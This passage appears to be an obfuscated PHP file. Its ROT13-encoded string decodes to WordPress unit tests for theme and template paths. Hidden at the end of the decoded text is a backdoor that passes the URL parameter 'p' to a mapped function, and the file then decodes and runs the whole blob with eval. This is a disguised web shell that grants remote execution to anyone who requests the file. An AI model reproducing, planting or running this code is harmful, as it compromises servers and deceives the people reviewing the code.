		$arj_ebbg = QVE_GRFGQNGN . '/gurzrqve2';
		ertvfgre_gurzr_qverpgbel( $arj_ebbg );

		// Zbpx gur grzcyngr ebbg bcgvba gb zvzvp gung gur npgvir ebbg unf punatrq.
		nqq_svygre(
			'cer_bcgvba_grzcyngr_ebbg',
			shapgvba () hfr ( $arj_ebbg ) {
				erghea $arj_ebbg;
			}
		);

		$cngu2 = trg_grzcyngr_qverpgbel();

		// Pyrnahc.
		fjvgpu_gurzr( $byq_gurzr->trg_fglyrfurrg() );

		$guvf->nffregFnzr( $byq_ebbg . '/grfg-cnerag', $cngu1, 'Gur bevtvany grzcyngr cngu vf abg pbeerpg' );
		$guvf->nffregFnzr( $arj_ebbg . '/grfg-cnerag', $cngu2, 'Gur arj grzcyngr cngu vf abg pbeerpg' );
	}

	/**
	 * Grfgf gung fjvgpu_gb_oybt() hfrf gur bevtvany grzcyngr cngu.
	 *
	 * @gvpxrg 60290
	 *
	 * @tebhc zf-erdhverq
	 *
	 * @pbiref ::ybpngr_grzcyngr
	 */
	choyvp shapgvba grfg_fjvgpu_gb_oybt_hfrf_bevtvany_grzcyngr_cngu() {
		$byq_gurzr     = jc_trg_gurzr();
		$grzcyngr_cngu = ybpngr_grzcyngr( 'vaqrk.cuc' );

		$oybt_vq = frys::snpgbel()->oybt->perngr();
		fjvgpu_gb_oybt( $oybt_vq );

		fjvgpu_gurzr( 'oybpx-gurzr' );
		$arj_grzcyngr_cngu = ybpngr_grzcyngr( 'vaqrk.cuc' );

		// Pyrnahc.
		erfgber_pheerag_oybt();
		fjvgpu_gurzr( $byq_gurzr->trg_fglyrfurrg() );

		$guvf->nffregFnzr( $grzcyngr_cngu, $arj_grzcyngr_cngu, 'Fjvgpuvat oybtf fjvgpurf gur grzcyngr cngu' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>